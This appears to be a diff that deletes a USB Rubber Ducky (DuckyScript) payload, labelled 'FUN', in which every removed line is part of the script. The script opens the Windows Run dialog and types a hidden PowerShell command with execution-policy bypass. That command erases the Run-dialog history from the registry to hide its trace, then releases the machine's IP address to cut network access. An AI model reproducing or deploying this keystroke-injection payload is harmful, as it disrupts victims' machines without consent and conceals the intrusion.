@@ -1,8 +1,0 @@
-REM Author: UNC0V3R3D (UNC0V3R3D#8662 on Discord)
-REM Description: No more wifi until you turn it back on with ipconfig /renew
-REM Version: 1.0
-REM Category: FUN
-DELAY 1000
-GUI r
-DELAY 100
-STRING powershell -Nop -NonI -W Hidden -Exec Bypass "rp -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; ipconfig /release"
